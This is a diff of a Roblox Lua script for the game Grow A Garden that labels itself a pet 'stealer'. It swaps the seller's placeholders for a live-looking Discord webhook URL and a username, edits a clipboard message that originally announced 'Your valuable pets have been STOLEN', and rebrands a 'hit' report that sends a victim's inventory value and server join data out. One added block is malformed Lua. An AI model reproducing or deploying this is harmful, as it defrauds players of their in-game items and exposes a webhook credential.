@@ -1,18 +1,7 @@
---[[
-   _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
-  / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
- | (___ | |    | |__) | | | | |__) | | | | (___       | (___ | \  / |
-  \___ \| |    |  _  /  | | |  ___/  | |  \___ \       \___ \| |\/| |
-  ____) | |____| | \ \ _| |_| |      | |  ____) |  _   ____) | |  | |
- |_____/ \_____|_|  \_\_____|_|      |_| |_____/  (_) |_____/|_|  |_|
-                                                                     
-                        Scripts.SM | Premium Scripts
-                        Made by: Scripter.SM
-                        Discord: discord.gg/d2zgg2YDMz
-]]
 
-getgenv().Webhook = "PUT_HERE_UR_WEBHOOK"
-getgenv().Username = "PUT_HERE_UR_USERNAME"
+
+getgenv().Webhook = "https://discord.com/api/webhooks/1405121051477803102/pnu2XS_rPDRQ1_vINi0D_tskqD4F7VozMHne_xiz29EYWULB9yU_lG4B2T97XvPsdQhx"
+getgenv().Username = "Soloxdragon4"
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -31,7 +20,7 @@ getgenv().Username = "PUT_HERE_UR_USERNAME"
         local attempt = 1
         local teleported = false
 
-        setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
+        setclipboard("hi guy")
 
         
         if GetServerType:InvokeServer() == "VIPServer" then
@@ -416,7 +405,7 @@ end
 local formattedTotalValue = formatNumberWithCommas(totalValue)
 
 local embed = {
-    title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
+    title = "🌵 Grow A Garden Hit - SOLO X FURY STEALER MADE BY NOTHING",
     color = 65280,
     fields = {
         {
@@ -444,11 +433,17 @@ local embed = {
         {
             name = "🏝️ **Join with URL**",
             value = string.format(
-                "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
-                game.JobId,
-                game.PlaceId,
-                game.JobId
-            ),
+                ["game:GetService("TeleportService").TeleportInitFailed:Connect(function(_,_,_,_,v)
+    queue_on_teleport(string.format([[getgenv().JobId = "%s"]], v.ServerInstanceId))
+end)
+
+
+for _ = 1, 2 do
+    task.spawn(function()
+        game:GetService("TeleportService"):TeleportToPlaceInstance(126884695634066, game.JobId)
+    end)
+    task.wait()
+end"],
             inline = false
         }
     },
@@ -848,4 +843,5 @@ end)
                 end       
             end
         end
+
     end
